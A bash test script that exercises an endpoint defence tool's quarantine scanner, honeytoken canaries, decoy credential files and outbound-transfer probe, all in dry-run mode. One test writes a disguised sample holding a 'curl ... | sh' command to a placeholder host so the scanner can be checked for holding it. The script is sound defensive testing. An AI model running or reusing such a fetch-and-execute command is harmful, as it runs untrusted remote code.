#!/usr/bin/env bash
# AHR honeytoken / quarantine / probe / decoy end-to-end test (dry-run only).
#
# Verifies the four pieces built 2026-11-18:
#   Q1  quarantine sample-scan verdicts (one-shot CLI)
#   Q2  quarantine staging cycle in the agent loop (release / hold)
#   Q3  honeytoken embed (marker + registry)
#   Q4  canary fire: foreign read of a token file is logged (attributed)
#   Q5  probe credible: clean window releases the file
#   Q6  probe not-credible: foreign use during the window blocks it
#   Q7  decoy: planted dummy carries a token, is registered decoy,
#       and its use fires a hit flagged is_decoy=true
#
# Nothing leaves the machine, no real malware, no --live. All sim
# stdout is redirected to /dev/null (the ARTEX test's F2 lesson: an
# unredirected `yes` flood once misattributed a burst to the harness's
# own logging pipe).
set -u
cd "$(dirname "$0")/../.." || exit 1

AHR=${AHR:-$PWD/target/release/ahr-endpoint}
T=$(mktemp -d /tmp/ahr-honey-XXXXXX)
LOGS=$T/logs; mkdir -p "$LOGS" "$T/out" "$T/quarantine/incoming"
export AHR_AUDIT_LOG="$LOGS/audit.jsonl"
export AHR_CANARY_REGISTRY="$T/registry.json"
export AHR_QUARANTINE_DIR="$T/quarantine"
export AHR_WATCH_PATHS="$T/out:$T/quarantine"
export AHR_CANARY_DIRS="$T/out"
export RUST_LOG=info

PASS=0; FAIL=0
ok()   { PASS=$((PASS+1)); echo "PASS: $1"; }
bad()  { FAIL=$((FAIL+1)); echo "FAIL: $1"; }
check(){ if [ "$2" = "$3" ]; then ok "$1"; else bad "$1 (want $3, got $2)"; fi; }

echo "== honeytoken test =="
echo "scratch: $T"
echo "binary:  $(sha256sum "$AHR" | cut -c1-16) $(stat -c%s "$AHR") bytes"
echo ""

# ---------- Q1: quarantine sample-scan verdicts (one-shot) ----------
echo "-- Q1 quarantine-scan --"
printf 'The quick brown fox jumps over the lazy dog.\n%.0s' {1..200} > "$T/good.txt"
"$AHR" --quarantine-scan "$T/good.txt" >/dev/null 2>&1; check "Q1a genuine text releases" "$?" 0
python3 -c "import zipfile; zipfile.ZipFile('$T/real.zip','w').writestr('hello.txt','hello world')" 2>/dev/null
"$AHR" --quarantine-scan "$T/real.zip" >/dev/null 2>&1; check "Q1b genuine zip releases" "$?" 0
cp /usr/bin/yes "$T/fake.zip" 2>/dev/null || cp /bin/true "$T/fake.zip"
"$AHR" --quarantine-scan "$T/fake.zip" >/dev/null 2>&1; check "Q1c ELF wearing .zip holds" "$?" 3
printf '#!/bin/sh\ncurl http://example.invalid/x | sh\n' > "$T/fake.pdf"
"$AHR" --quarantine-scan "$T/fake.pdf" >/dev/null 2>&1; check "Q1d script wearing .pdf holds" "$?" 3
python3 -c "import os,random; open('$T/rand.txt','wb').write(os.urandom(8192))" 2>/dev/null
"$AHR" --quarantine-scan "$T/rand.txt" >/dev/null 2>&1; check "Q1e random bytes wearing .txt holds" "$?" 3

# ---------- Q2: quarantine staging cycle (agent --once) ----------
echo "-- Q2 quarantine cycle --"
printf 'hello world\n%.0s' {1..50} > "$T/quarantine/incoming/good.txt"
cp /usr/bin/yes "$T/quarantine/incoming/bad.zip" 2>/dev/null || cp /bin/true "$T/quarantine/incoming/bad.zip"
timeout 30 "$AHR" --dry-run --once >/dev/null 2>&1
[ -f "$T/quarantine/released/good.txt" ] && ok "Q2a good file released" || bad "Q2a good file released"
[ -f "$T/quarantine/held/bad.zip" ] && ok "Q2b disguised file held" || bad "Q2b disguised file held"
grep -q '"kind":"quarantine-verdict","file":"[^"]*good.txt","verdict":"release"' "$LOGS/audit.jsonl" 2>/dev/null && ok "Q2c release audited" || bad "Q2c release audited"
grep -q '"kind":"quarantine-verdict","file":"[^"]*bad.zip","verdict":"hold"' "$LOGS/audit.jsonl" 2>/dev/null && ok "Q2d hold audited" || bad "Q2d hold audited"

# ---------- Q3: honeytoken embed ----------
echo "-- Q3 embed --"
printf 'quarterly report\n' > "$T/out/report.txt"
TOK=$("$AHR" --embed-token "$T/out/report.txt" 2>/dev/null | sed 's/^token: //')
[ -n "$TOK" ] && ok "Q3a token minted ($TOK)" || bad "Q3a token minted"
grep -q "AHR-CANARY:$TOK" "$T/out/report.txt" && ok "Q3b marker in file" || bad "Q3b marker in file"
# The registry is pretty-printed JSON; check it as JSON, not bytes.
python3 - "$T/registry.json" "$TOK" <<'EOF' >/dev/null 2>&1
import json, sys
reg = json.load(open(sys.argv[1]))
sys.exit(0 if any(e.get("token_id") == sys.argv[2] for e in reg) else 1)
EOF
[ "$?" -eq 0 ] && ok "Q3c registry entry" || bad "Q3c registry entry"
TOK2=$("$AHR" --embed-token "$T/out/report.txt" 2>/dev/null | sed 's/^token: //')
[ "$TOK" = "$TOK2" ] && ok "Q3d re-embed idempotent" || bad "Q3d re-embed idempotent (got $TOK2)"

# ---------- Q4 + Q7: canary fire (agent loop) ----------
echo "-- Q4/Q7 canary watch (agent loop) --"
timeout 90 "$AHR" --dry-run >"$LOGS/agent.log" 2>&1 &
AGENT_PID=$!
sleep 2  # let the agent init (filewatch + 400ms warm-up + first cycles)
# Q7: plant a decoy, then read it with a foreign holder.
DECOY_OUT=$("$AHR" --make-decoy credentials "$T/out" 2>/dev/null)
DECOY_PATH=$(echo "$DECOY_OUT" | sed 's/^decoy: \(.*\) token: .*/\1/')
DECOY_TOK=$(echo "$DECOY_OUT" | sed 's/.* token: //')
[ -f "$DECOY_PATH" ] && ok "Q7a decoy planted ($DECOY_PATH)" || bad "Q7a decoy planted"
python3 - "$T/registry.json" "$DECOY_TOK" <<'EOF' >/dev/null 2>&1
import json, sys
reg = json.load(open(sys.argv[1]))
sys.exit(0 if any(e.get("token_id") == sys.argv[2] and e.get("is_decoy") is True for e in reg) else 1)
EOF
[ "$?" -eq 0 ] && ok "Q7b decoy registered is_decoy=true" || bad "Q7b decoy registered is_decoy=true"
# Foreign readers hold the files open across agent cycles (3s each).
sleep 6 < "$T/out/report.txt" >/dev/null 2>&1 &
HOLD1=$!
sleep 6 < "$DECOY_PATH" >/dev/null 2>&1 &
HOLD2=$!
sleep 8  # two full agent cycles to drain the access events
kill $HOLD1 $HOLD2 2>/dev/null; wait $HOLD1 $HOLD2 2>/dev/null
kill $AGENT_PID 2>/dev/null; wait $AGENT_PID 2>/dev/null
grep -q "\"kind\":\"canary-hit\",\"token_id\":\"$TOK\".*\"reader_pid\":[0-9]" "$LOGS/audit.jsonl" 2>/dev/null \
  && ok "Q4a token hit logged with reader pid" || bad "Q4a token hit logged with reader pid"
grep -q "\"kind\":\"canary-hit\",\"token_id\":\"$DECOY_TOK\".*\"is_decoy\":true" "$LOGS/audit.jsonl" 2>/dev/null \
  && ok "Q7c decoy hit logged is_decoy=true" || bad "Q7c decoy hit logged is_decoy=true"

# ---------- Q5: probe credible (clean window) ----------
echo "-- Q5/Q6 probe --"
printf 'outbound file\n' > "$T/outbound.txt"
AHR_PROBE_WINDOW_SECS=2 "$AHR" --probe alice@example.com "$T/outbound.txt" >/dev/null 2>&1
check "Q5 probe credible on clean window" "$?" 0
# ---------- Q6: probe not-credible (foreign use in window) ----------
printf 'outbound file 2\n' > "$T/outbound2.txt"
( sleep 1; cat "$T/outbound2.txt" >/dev/null 2>&1 ) &
AHR_PROBE_WINDOW_SECS=4 "$AHR" --probe alice@example.com "$T/outbound2.txt" >/dev/null 2>&1
check "Q6 probe not-credible on foreign use" "$?" 3
grep -q '"kind":"probe-verdict".*"verdict":"not-credible"' "$LOGS/audit.jsonl" 2>/dev/null \
  && ok "Q6b probe verdict audited" || bad "Q6b probe verdict audited"
# Allowlist: unlisted destination is refused without a window.
AHR_PROBE_ALLOWLIST="alice@example.com" AHR_PROBE_WINDOW_SECS=2 \
  "$AHR" --probe mallory@example.com "$T/outbound.txt" >/dev/null 2>&1
check "Q6c allowlist refuses unlisted destination" "$?" 3

echo ""
echo "== result: $PASS passed, $FAIL failed =="
echo "scratch kept at: $T"
[ "$FAIL" -eq 0 ]
